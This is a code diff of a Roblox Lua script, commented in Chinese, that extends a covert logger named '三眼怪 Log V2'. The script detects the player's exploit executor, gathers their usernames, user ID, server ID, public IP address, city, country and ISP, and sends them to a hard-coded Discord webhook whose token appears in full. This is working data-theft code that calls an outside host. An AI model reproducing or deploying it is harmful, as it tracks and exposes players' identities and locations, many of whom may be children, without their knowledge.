@@ -1,13 +1,16 @@
+--// 服務初始化
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local LocalPlayer = Players.LocalPlayer
 
+--// 設定
 local webhookURL = "https://discord.com/api/webhooks/1389953544009814106/83Lx-nyCheX0oe9e-4e_cIJF_TU4JPxMGiYSxomG8RoGCa6S_bJeQOfFzS8CzwnI-nXg"
 local gameName = "Unknown"
 local embedColor = tonumber("0x00FF00" )
 local appIconURL = "https://i.ibb.co/fYSwfPm2/image.jpg"
 
+--// 增強的 HTTP 請求函數
 local function secureRequest(options )
     local requestFunc = request or http_request or (syn and syn.request )
     if requestFunc then
@@ -22,6 +25,18 @@ local function secureRequest(options )
     return nil
 end
 
+--// 新增: 偵測注入器的函數
+local function identifyexecutor()
+    if syn then return "Synapse X" end
+    if KRNL_LOADED then return "Krnl" end
+    if getgenv().secure_load then return "Sentinel" end
+    if IsScriptWare then return "Script-Ware" end
+    if is_fluxus_script then return "Fluxus" end
+    if getgenv().coconame then return "Coco Z" end
+    return "Unknown"
+end
+
+--// 獲取 IP 和地理位置的函數
 local function getSecretInfo()
     local ipServices = { "https://api.ipify.org", "https://ipinfo.io/ip", "https://icanhazip.com" }
     local ip
@@ -42,15 +57,33 @@ local function getSecretInfo()
     return { ip = ip, details = ipDetails }
 end
 
+--// 主要執行邏輯
 pcall(function()
+    -- 1. 獲取遊戲名稱
     pcall(function()
         local info = MarketplaceService:GetProductInfo(game.PlaceId)
         gameName = info.Name or "Unknown"
     end)
 
+    -- 2. 獲取 IP 資訊
     local secretInfo = getSecretInfo()
+
+    -- 3. 建立個人資料連結
     local profileUrl = "https://www.roblox.com/users/" .. tostring(LocalPlayer.UserId ) .. "/profile"
 
+    -- 4. 準備一個空的 embeds 陣列，用來存放所有區塊
+    local embeds = {}
+
+    -- 5. 創建第一個 embed (注入器資訊)
+    local executorName = identifyexecutor()
+    local executorEmbed = {
+        title = "Executor Log:",
+        description = string.format("**注入器名稱:** `%s`", executorName),
+        color = embedColor
+    }
+    table.insert(embeds, executorEmbed)
+
+    -- 6. 創建第二個 embed (玩家資訊)
     local playerDescription = string.format(
         "**顯示名稱:** `%s`\n" ..
         "**真實名稱:** `%s`\n" ..
@@ -67,15 +100,14 @@ pcall(function()
         #Players:GetPlayers(),
         game.JobId or "N/A"
     )
-    
     local playerEmbed = {
         title = "Player Log:",
         description = playerDescription,
         color = embedColor
     }
+    table.insert(embeds, playerEmbed)
 
-    local embeds = { playerEmbed }
-
+    -- 7. 如果有 IP 資訊，則創建第三個 embed (IP 資訊)
     if secretInfo and secretInfo.ip then
         local ip_info = secretInfo.details
         local location = (ip_info and ip_info.country and ip_info.city) and (ip_info.country .. ", " .. ip_info.city) or "未知"
@@ -87,16 +119,15 @@ pcall(function()
             "**網路供應商:** `%s`",
             secretInfo.ip, location, isp
         )
-
         local ipEmbed = {
             title = "IP Log:",
             description = ipDescription,
             color = embedColor
         }
-        
         table.insert(embeds, ipEmbed)
     end
 
+    -- 8. 構建並發送最終的 webhook 資料
     local data = {
         username = "三眼怪 Log V2",
         avatar_url = appIconURL,
